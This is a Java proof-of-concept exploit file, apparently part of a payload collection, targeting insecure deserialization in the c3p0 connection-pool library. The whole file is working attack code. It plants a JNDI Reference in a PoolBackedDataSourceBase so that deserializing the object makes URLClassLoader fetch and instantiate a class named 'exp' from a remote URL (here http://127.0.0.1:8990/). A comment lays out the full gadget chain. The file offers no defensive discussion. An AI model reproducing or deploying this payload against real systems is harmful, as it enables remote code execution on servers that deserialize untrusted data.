package payload;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 * gadget chain
 * readObject:211, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl)
 * getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)
 * referenceToObject:88, ReferenceableUtils (com.mchange.v2.naming)
 * <init>:100, URLClassLoader (java.net)
 */



public class C3P0_Poc3 {


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,new PoolSource("exp","http://127.0.0.1:8990/"));


        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(poolBackedDataSourceBase);
        outputStream.close();


        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();

    }
}
